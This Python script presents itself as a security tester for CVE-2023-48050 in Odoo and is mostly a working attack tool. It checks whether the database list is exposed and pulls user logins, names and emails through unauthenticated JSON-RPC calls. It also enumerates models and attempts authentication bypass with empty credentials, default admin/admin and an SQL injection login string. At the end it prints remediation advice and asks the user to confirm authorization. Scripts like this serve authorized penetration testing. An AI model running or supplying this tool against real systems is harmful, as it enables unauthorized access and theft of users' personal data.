#!/usr/bin/env python3
"""
CVE-2023-48050 Enhanced Security Tester with User Enumeration
For authorized security testing only
"""

import requests
import json
import sys
import urllib3
from datetime import datetime

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class OdooSecurityTester:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.databases = []
        self.vulnerabilities = {}
        self.user_data = {}
        
    def check_database_list(self):
        """Check if database list is exposed"""
        endpoint = f"{self.target_url}/web/database/list"
        print(f"[*] Checking database list exposure: {endpoint}")
        
        try:
            headers = {'Content-Type': 'application/json'}
            data = json.dumps({
                "jsonrpc": "2.0",
                "method": "call",
                "params": {},
                "id": 1
            })
            
            response = self.session.post(endpoint, data=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                if 'result' in result:
                    self.databases = result['result']
                    print(f"[!] VULNERABLE: Database list exposed")
                    print(f"    Databases found: {self.databases}")
                    self.vulnerabilities['database_list'] = self.databases
                    return True
        except Exception as e:
            print(f"[-] Error checking database list: {str(e)}")
        
        return False
    
    def enumerate_users(self, db_name):
        """Attempt to enumerate users from the database"""
        print(f"\n[*] Attempting user enumeration on database: {db_name}")
        
        # Try multiple RPC endpoints
        endpoints = [
            '/jsonrpc',
            '/web/dataset/call_kw',
            '/web/dataset/search_read'
        ]
        
        for endpoint in endpoints:
            self.try_user_enumeration(db_name, endpoint)
    
    def try_user_enumeration(self, db_name, endpoint):
        """Try different methods to enumerate users"""
        full_endpoint = f"{self.target_url}{endpoint}"
        
        # Method 1: Try to access res.users model without authentication
        payloads = [
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "service": "object",
                    "method": "execute",
                    "args": [db_name, None, None, "res.users", "search_read", 
                            [], ["login", "name", "email", "active", "create_date"]]
                },
                "id": 1
            },
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "service": "object",
                    "method": "execute_kw",
                    "args": [db_name, None, None, "res.users", "search_read",
                            [[]], {"fields": ["login", "name", "email"]}]
                },
                "id": 2
            },
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "model": "res.users",
                    "method": "search_read",
                    "args": [[]],
                    "kwargs": {
                        "fields": ["login", "name", "email", "lang", "tz"],
                        "limit": 100,
                        "context": {"lang": "en_US"}
                    }
                },
                "id": 3
            }
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    full_endpoint,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and result['result']:
                        self.process_user_data(db_name, result['result'])
                        return True
                    elif 'error' in result:
                        # Try to extract information from error messages
                        self.analyze_error_message(result['error'])
                        
            except Exception as e:
                continue
        
        return False
    
    def try_authentication_bypass(self, db_name):
        """Attempt authentication bypass techniques"""
        print(f"[*] Attempting authentication bypass on {db_name}")
        
        bypass_payloads = [
            # Try with empty/null credentials
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "db": db_name,
                    "login": "",
                    "password": ""
                },
                "id": 1
            },
            # Try common default credentials
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "db": db_name,
                    "login": "admin",
                    "password": "admin"
                },
                "id": 2
            },
            # Try SQL injection in login
            {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "db": db_name,
                    "login": "admin' OR '1'='1",
                    "password": "anything"
                },
                "id": 3
            }
        ]
        
        endpoint = f"{self.target_url}/web/session/authenticate"
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(
                    endpoint,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result and result['result'].get('uid'):
                        print(f"[!] CRITICAL: Authentication bypass successful!")
                        print(f"    Payload: {payload['params']}")
                        self.extract_session_info(result['result'])
                        return True
                        
            except Exception:
                continue
        
        return False
    
    def extract_session_info(self, session_data):
        """Extract and display session information"""
        if session_data:
            print("[+] Session Information Extracted:")
            important_fields = ['uid', 'username', 'name', 'email', 'company_id', 
                              'groups', 'user_companies', 'db']
            
            for field in important_fields:
                if field in session_data:
                    print(f"    {field}: {session_data[field]}")
    
    def enumerate_models(self, db_name):
        """Try to enumerate available models"""
        print(f"[*] Attempting to enumerate models on {db_name}")
        
        endpoint = f"{self.target_url}/jsonrpc"
        payload = {
            "jsonrpc": "2.0",
            "method": "call",
            "params": {
                "service": "object",
                "method": "execute",
                "args": [db_name, None, None, "ir.model", "search_read",
                        [], ["model", "name"]]
            },
            "id": 1
        }
        
        try:
            response = self.session.post(
                endpoint,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if 'result' in result and isinstance(result['result'], list):
                    print(f"[+] Models found: {len(result['result'])}")
                    # Show first few interesting models
                    interesting_models = ['res.users', 'res.partner', 'res.company', 
                                        'ir.config_parameter', 'ir.attachment']
                    for model in result['result'][:10]:
                        if any(im in str(model) for im in interesting_models):
                            print(f"    [!] Interesting model: {model}")
                            
        except Exception as e:
            pass
    
    def process_user_data(self, db_name, data):
        """Process extracted user data"""
        if not data:
            return
            
        print(f"[!] USER DATA EXTRACTED from {db_name}:")
        
        if isinstance(data, list):
            for user in data[:10]:  # Limit to first 10 users
                if isinstance(user, dict):
                    print(f"\n  User ID: {user.get('id', 'N/A')}")
                    print(f"    Login: {user.get('login', 'N/A')}")
                    print(f"    Name: {user.get('name', 'N/A')}")
                    print(f"    Email: {user.get('email', 'N/A')}")
                    print(f"    Active: {user.get('active', 'N/A')}")
                    
                    # Store for later analysis
                    user_id = user.get('id', 'unknown')
                    self.user_data[user_id] = user
        
        print(f"\n[+] Total users extracted: {len(data) if isinstance(data, list) else 1}")
    
    def analyze_error_message(self, error):
        """Analyze error messages for information disclosure"""
        error_str = str(error)
        
        # Check for information disclosure in errors
        indicators = [
            'res.users',
            'PostgreSQL',
            'database',
            'table',
            'column',
            'permission',
            'access'
        ]
        
        for indicator in indicators:
            if indicator.lower() in error_str.lower():
                print(f"[*] Information disclosure in error: {indicator} found")
                break
    
    def check_public_methods(self, db_name):
        """Check for publicly accessible methods"""
        print(f"[*] Checking public methods on {db_name}")
        
        public_methods = [
            'version',
            'about',
            'get_list',
            'get_lang_list',
            'get_countries_list'
        ]
        
        endpoint = f"{self.target_url}/jsonrpc"
        
        for method in public_methods:
            payload = {
                "jsonrpc": "2.0",
                "method": "call",
                "params": {
                    "service": "common",
                    "method": method,
                    "args": []
                },
                "id": 1
            }
            
            try:
                response = self.session.post(
                    endpoint,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'result' in result:
                        print(f"  [+] Method '{method}' accessible")
                        if method == 'version' and result['result']:
                            print(f"      Version info: {result['result']}")
                            
            except Exception:
                continue
    
    def generate_report(self):
        """Generate comprehensive security report"""
        print("\n" + "="*60)
        print("ENHANCED SECURITY TEST REPORT - CVE-2023-48050")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if self.vulnerabilities:
            print("\n[!] CRITICAL VULNERABILITIES FOUND:")
            for vuln, details in self.vulnerabilities.items():
                print(f"  - {vuln}: {details}")
        
        if self.user_data:
            print(f"\n[!] USER DATA COMPROMISED:")
            print(f"  - {len(self.user_data)} user accounts exposed")
            print("  - Sensitive information includes: login names, emails, user IDs")
        
        print("\n[RECOMMENDATIONS]:")
        print("1. IMMEDIATE: Update Odoo to the latest security patch")
        print("2. Disable database manager in production (/web/database/manager)")
        print("3. Implement IP whitelisting for administrative endpoints")
        print("4. Enable proper authentication on all RPC endpoints")
        print("5. Configure fail2ban to prevent enumeration attacks")
        print("6. Review and restrict JSON-RPC access policies")
        print("7. Implement rate limiting on sensitive endpoints")
        print("8. Enable audit logging for all database operations")
        
        print("\n[COMPLIANCE NOTES]:")
        print("- This vulnerability may lead to GDPR violations (user data exposure)")
        print("- PCI DSS compliance may be affected if payment data is stored")
        print("- Immediate remediation required for regulatory compliance")

def main():
    print("="*60)
    print("CVE-2023-48050 ENHANCED SECURITY TESTER")
    print("FOR AUTHORIZED TESTING ONLY")
    print("="*60)
    
    # Get authorization
    auth = input("\nDo you have authorization to test the target? (yes/no): ")
    if auth.lower() != 'yes':
        print("[-] Testing aborted. Authorization required.")
        sys.exit(1)
    
    # Get target
    target = input("Enter target URL (e.g., http://10.6.23.8:9093): ")
    
    print(f"\n[*] Starting enhanced security test on: {target}")
    
    # Initialize tester
    tester = OdooSecurityTester(target)
    
    # Run tests
    if tester.check_database_list():
        for db in tester.databases:
            tester.enumerate_users(db)
            tester.try_authentication_bypass(db)
            tester.enumerate_models(db)
            tester.check_public_methods(db)
    
    # Generate report
    tester.generate_report()

if __name__ == "__main__":
    main()